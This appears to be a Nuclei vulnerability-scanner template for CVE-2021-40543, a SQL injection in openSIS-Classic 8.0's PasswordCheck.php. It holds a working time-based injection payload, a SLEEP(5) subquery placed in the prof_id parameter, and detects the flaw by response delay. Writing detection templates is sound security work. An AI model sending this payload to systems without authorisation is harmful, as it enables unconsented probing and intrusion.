id: CVE-2021-40543

info:
  name: SQL Injection in Opensis-Classic PasswordCheck.php
  author: ProjectDiscoveryAI
  severity: critical
  description: Opensis-Classic Version 8.0 is affected by a SQL injection vulnerability due to a lack of sanitization of input data at two parameters $_GET['usrid'] and $_GET['prof_id'] in the PasswordCheck.php file.
  reference:
    - https://github.com/OS4ED/openSIS-Classic/issues/191

http:
  - method: GET
    path:
      - "{{BaseURL}}/PasswordCheck.php?password=P@a&usrid=1&prof_id=1%27%20AND%20(SELECT%209714%20FROM%20(SELECT(SLEEP(5)))vGYX)--%20-"
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
This template checks for a time-based SQL injection vulnerability in the "PasswordCheck.php" file by observing if the response time is significantly longer than usual, indicating that the database query was delayed by the injected SQL command.